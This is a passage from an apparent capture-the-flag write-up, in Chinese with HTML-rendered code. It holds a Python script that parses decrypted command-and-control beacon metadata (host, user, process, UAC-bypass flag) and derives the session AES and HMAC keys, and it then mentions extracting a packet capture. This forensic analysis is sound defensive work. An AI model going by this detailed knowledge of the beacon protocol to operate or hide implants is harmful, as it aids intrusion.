class="string">&quot;IBM01143&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1144</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01144&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1145</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01145&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1146</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01146&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1147</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01147&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1148</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01148&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1149</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM01149&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-16LE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1201</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-16BE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1250</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1250&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1251</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1251&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1252</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1252&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1253</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1253&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1254</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1254&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1255</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1255&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1256</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1256&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1257</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1257&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1258</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;windows-1258&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">1361</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-Johab&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacRoman&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10002</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10003</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10004</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacArabic&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10005</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacHebrew&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10006</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacGreek&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10007</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacCyrillic&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10008</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10010</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacRomania&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10017</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacUkraine&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10021</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacThai&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10029</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacCentralEurope&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10079</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacIceland&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10081</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacTurkish&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">10082</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-MacCroatian&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">12000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-32LE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">12001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-32BE&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISO-2022-CN-CNS&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20002</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20003</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20004</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20005</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20105</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20106</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20107</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20108</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20127</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;US-ASCII&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20261</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20269</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20273</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM273&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20277</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM277&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20278</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM278&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20280</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM280&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20284</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM284&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20285</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM285&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20290</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM290&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20297</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM297&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20420</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM420&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20423</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20424</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM424&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20833</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20838</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM-Thai&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20866</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;KOI8-R&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20871</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;IBM871&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20880</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20905</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20924</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20932</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EUC-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB2312&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">20949</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">21025</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM1025&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">21027</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">21866</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;KOI8-U&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28591</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-1&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28592</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-2&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28593</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-3&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28594</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-4&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28595</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-5&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28596</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-6&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28597</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-7&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28598</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-8&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28599</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-9&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28603</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-13&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">28605</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-15&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">29001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">38598</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-8859-8&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50220</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50221</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-JP-2&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50222</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50225</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-KR&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50227</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-CN&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50229</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ISO-2022-CN&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50930</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM930&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50931</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50933</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM933&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50935</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM935&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50937</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM937&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">50939</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-IBM939&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51932</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EUC-JP&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB2312&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51949</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;EUC-KR&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51950</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">52936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB2312&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">54936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB18030&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57002</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57003</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57004</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57005</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57006</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57007</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57008</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57009</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57010</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57011</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">65000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">65001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> plaintext[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">b&#x27;\x00\x00\xBE\xEF&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 16</span></span><br><span class="line">    raw_aes_keys = plaintext[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    var9 = plaintext[<span class="number">24</span>:<span class="number">26</span>]</span><br><span class="line">    var9 = <span class="built_in">int</span>.from_bytes(var9, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    var9 = getName(var9)</span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    var10 = plaintext[<span class="number">26</span>:<span class="number">28</span>]</span><br><span class="line">    var10 = <span class="built_in">int</span>.from_bytes(var10, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    var10 = getName(var10)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    <span class="built_in">id</span> = plaintext[<span class="number">28</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">int</span>.from_bytes(<span class="built_in">id</span>, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Beacon id:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    pid = plaintext[<span class="number">32</span>:<span class="number">36</span>]</span><br><span class="line">    pid = <span class="built_in">int</span>.from_bytes(pid, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;pid:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(pid))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    port = plaintext[<span class="number">36</span>:<span class="number">38</span>]</span><br><span class="line">    port = <span class="built_in">int</span>.from_bytes(port, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1</span></span><br><span class="line">    flag = plaintext[<span class="number">38</span>:<span class="number">39</span>]</span><br><span class="line">    flag = <span class="built_in">int</span>.from_bytes(flag, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isFlag(flag, <span class="number">1</span>):</span><br><span class="line">        barch = <span class="string">&quot;&quot;</span></span><br><span class="line">        pid = <span class="string">&quot;&quot;</span></span><br><span class="line">        is64 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> isFlag(flag, <span class="number">2</span>):</span><br><span class="line">        barch = <span class="string">&quot;x64&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        barch = <span class="string">&quot;x86&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isFlag(flag, <span class="number">4</span>):</span><br><span class="line">        is64 = <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        is64 = <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isFlag(flag, <span class="number">8</span>):</span><br><span class="line">        bypassuac = <span class="string">&quot;True&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bypassuac = <span class="string">&quot;False&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;barch:&quot;</span> + barch)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;is64:&quot;</span> + is64)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bypass:&quot;</span> + bypassuac)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    var_1 = plaintext[<span class="number">39</span>:<span class="number">40</span>]</span><br><span class="line">    var_2 = plaintext[<span class="number">40</span>:<span class="number">41</span>]</span><br><span class="line">    var_1 = <span class="built_in">int</span>.from_bytes(var_1, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    var_2 = <span class="built_in">int</span>.from_bytes(var_2, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    windows_var = <span class="built_in">str</span>(var_1) + <span class="string">&quot;.&quot;</span> + <span class="built_in">str</span>(var_2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;windows var:&quot;</span> + windows_var)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    windows_build = plaintext[<span class="number">41</span>:<span class="number">43</span>]</span><br><span class="line">    windows_build = <span class="built_in">int</span>.from_bytes(windows_build, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;windows build:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(windows_build))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    x64_P = plaintext[<span class="number">43</span>:<span class="number">47</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    ptr_gmh = plaintext[<span class="number">47</span>:<span class="number">51</span>]</span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    ptr_gpa = plaintext[<span class="number">51</span>:<span class="number">55</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if (&quot;x64&quot;.equals(this.barch)) &#123;</span></span><br><span class="line">    <span class="comment"># this.ptr_gmh = CommonUtils.join(var10, this.ptr_gmh)</span></span><br><span class="line">    <span class="comment"># this.ptr_gpa = CommonUtils.join(var10, this.ptr_gpa)</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># this.ptr_gmh = CommonUtils.bswap(this.ptr_gmh)</span></span><br><span class="line">    <span class="comment"># this.ptr_gpa = CommonUtils.bswap(this.ptr_gpa)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    intz = plaintext[<span class="number">55</span>:<span class="number">59</span>]</span><br><span class="line">    intz = <span class="built_in">int</span>.from_bytes(intz, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    intz = toIP(intz)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> intz == <span class="string">&quot;0.0.0.0&quot;</span>:</span><br><span class="line">        intz = <span class="string">&quot;unknown&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;host:&quot;</span> + intz)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> var9 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        ddata = plaintext[<span class="number">59</span>:].decode(<span class="string">&quot;ISO8859-1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ddata = plaintext[<span class="number">59</span>:].decode(<span class="string">&quot;ISO8859-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ddata = ddata.split(<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ddata) &gt; <span class="number">0</span>:</span><br><span class="line">        computer = ddata[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ddata) &gt; <span class="number">1</span>:</span><br><span class="line">        username = ddata[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ddata) &gt; <span class="number">2</span>:</span><br><span class="line">        process = ddata[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PC name:&quot;</span> + computer)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;username:&quot;</span> + username)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;process name:&quot;</span> + process)</span><br><span class="line"></span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys)</span><br><span class="line">    digest = raw_aes_hash256.digest()</span><br><span class="line">    aes_key = digest[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    hmac_key = digest[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES key:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(aes_key.<span class="built_in">hex</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HMAC key:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(hmac_key.<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Ciphertext:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(plaintext.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128153609278.png" alt="image-20250128153609278"></p><p>在流1382处传了一个流量包，提取出来</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128165615257.png" alt="image-20250128165615257"></p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128165755667.png" alt="image-20250128165755667"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 